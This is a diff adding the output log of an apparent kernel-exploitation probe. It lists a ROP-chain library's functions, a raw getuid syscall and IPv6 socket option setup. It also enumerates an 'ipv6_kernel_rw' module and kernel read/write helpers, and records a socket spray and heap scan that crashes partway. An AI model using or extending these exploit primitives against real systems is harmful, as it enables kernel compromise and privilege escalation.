@@ -1,0 +1,113 @@
+=== PROBE 125l: ROPCHAIN DIRECT SYSCALL ===
+--- SECTION A: ROPCHAIN API ---
+ropchain type=table
+  push_fcall=function
+  push_increment_atomic_qword=function
+  create_fcall_stub=function
+  push_set_reg_from_rax=function
+  __tostring=function
+  dont_recurse=boolean
+  push_sysv=function
+  execute_through_coroutine=function
+  push_add_dword_memory_with_ecx=function
+  restore_through_longjmp=function
+  gen_loop=function
+  push_set_rcx=function
+  push_set_r8=function
+  push_store_eax_into_memory=function
+  push_add_dword_memory=function
+  gen_conditional=function
+  push_set_reg_from_reg=function
+  push_set_r9=function
+  push_syscall_raw=function
+  dispatch_jumptable_with_rax_index=function
+  push_set_r9_wo_call=function
+  push_store_rdx_into_memory=function
+  push_store_rcx_into_memory=function
+  push_store_retval=function
+  push_fcall_with_ret=function
+  push_fcall_raw=function
+  push_set_rdi=function
+  push_set_rdx=function
+  push_syscall_with_ret=function
+  push_syscall=function
+  create_branch=function
+  push_set_rbp=function
+  push_decrement_atomic_qword=function
+  push_set_reg_from_rdi=function
+  push_write_qword_memory=function
+  push_write_dword_memory=function
+  push_set_reg_from_memory=function
+  push_add_atomic_qword=function
+  push_add_dword_memory_with_edi=function
+  push_set_rax_from_memory=function
+  push_add_dword_memory_with_eax=function
+  align_stack=function
+  increment_stack=function
+  new=function
+  push_set_rsp=function
+  push_store_rax_into_memory=function
+  push_add_to_rax=function
+  push_set_rsi=function
+  get_rsp=function
+  get_last_retval_addr=function
+  push_set_rax=function
+  create_hole=function
+  push_store_rax_data_and_add_into_memory=function
+  push=function
+  push_store_rdi_into_memory=function
+  push_set_rbx=function
+  mock_push=function
+  push_ret=function
+  __index=table
+  push_store_rax_data_into_memory=function
+
+--- SECTION B: GETUID VIA ROPCHAIN ---
+getuid via syscall.getuid()=0x1
+  numeric=1
+section B: ok=true err=nil
+
+--- SECTION C: IPV6 SOCKET CREATION ---
+IPv6 UDP socket fd=0x18 numeric=24
+setsockopt IPV6_PKTINFO ret=0x0 numeric=0
+setsockopt IPV6_TCLASS ret=0x0 numeric=0
+IPv6 UDP socket2 fd=0x19 numeric=25
+socket2 setsockopt IPV6_PKTINFO ret=0x0 numeric=0
+sockets closed
+section C: ok=true err=nil
+
+--- SECTION D: IPV6_KERNEL_RW MODULE ---
+ipv6_kernel_rw exists
+  get_fd_data_addr=function
+  ipv6_kwrite=function
+  copyin=function
+  data=table
+  ipv6_kread=function
+  write_buffer=function
+  create_overlapped_ipv6_sockets=function
+  ipv6_write_to_victim=function
+  read_buffer=function
+  create_pipe_pair=function
+  ipv6_kread8=function
+  copyout=function
+  init=function
+
+--- SECTION E: KERNEL TABLE ---
+  kernel.read_null_terminated_string = function: 3105c2a80
+  kernel.read_byte = function: 310619240
+  kernel.write_byte = function: 310624d80
+  kernel.hex_dump = function: 3105c4ba0
+  kernel.read_qword = function: 3105c4b60
+  kernel.write_word = function: 310624dc0
+  kernel.write_qword = function: 3105c4520
+  kernel.read_word = function: 3105aa8e0
+  kernel.write_dword = function: 310624e00
+  kernel.read_dword = function: 3105aa880
+  kernel.addr = {
+  }
+
+--- SECTION F: KERNEL OBJECT SPRAY + HEAP SCAN ---
+created 50 IPv6 sockets with pktopts
+closed 25 sockets
+section F: ok=false err=[string "-- CRASH_CLASS: LOW..."]:165: attempt to call global 'make_syscall' (a nil value)
+=== PROBE 125l COMPLETE ===
